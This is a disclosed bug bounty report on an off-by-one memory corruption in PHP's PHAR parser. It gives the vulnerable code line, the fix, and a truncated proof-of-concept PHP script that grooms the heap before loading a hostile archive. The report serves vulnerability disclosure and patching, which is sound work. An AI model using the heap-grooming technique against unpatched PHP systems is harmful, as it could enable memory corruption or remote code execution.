# [M] Memory corruption when parsing a hostile PHAR archive

## Summary
Severity: Medium
Program: Internet Bug Bounty
Weakness: Memory Corruption - Generic
Reporter: aerodudrizzt
State: resolved
Disclosed: 2019-10-13T09:31:06.661Z
Source: https://hackerone.com/reports/195586

## Details
The vulnerability was reported to PHP's security team and was fixed:
* Ticket 73768: https://bugs.php.net/bug.php?id=73768
* Git commit: https://gist.github.com/anonymous/84961673ee34be7f1a52b83dd872af50

The PHAR module in all PHP versions (5.6.9 and below, 7.1.0 and below) is vulnerable to a memory corruption and possibly a remote code execution attack when parsing a hostile PHAR archive. Here are the technical details:
* File: ext\phar\phar.c
* Function:  phar_parse_pharfile()

The function incorrectly '\0' terminates the buffer in case the alias does not match:
```
buffer[tmp_len] = '\0';
```
When a hostile archive sets tmp_len to be manifest_length - 14, this will write the '\0' just outside the buffer (off-by-one), thus overriding emalloc's metadata.

The assignment should be replaced with:
```
buffer[MIN(tmp_len, (size_t)(endbuffer - buffer) - 1)] = '\0';
```

This vulnerability was demonstrated with this PHP script:
```
<?php
	$length = 192;
	$array  = array();
	$x = 0;
	while ( $x < 4 ){
		$array[$x++] = str_repeat($x, ($length - 20));
	}

	try{
		$p = Phar::LoadPhar('example_hostile.phar', 'alias.phar');
	}
	catch(Exception $e){
		echo "Failed to load the phar archive\n";
	}

	$s = str_repeat("\xef\xbe\xad\xde", ($length - 20) / 4);
	while ( $x < 8 ){
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/195586_
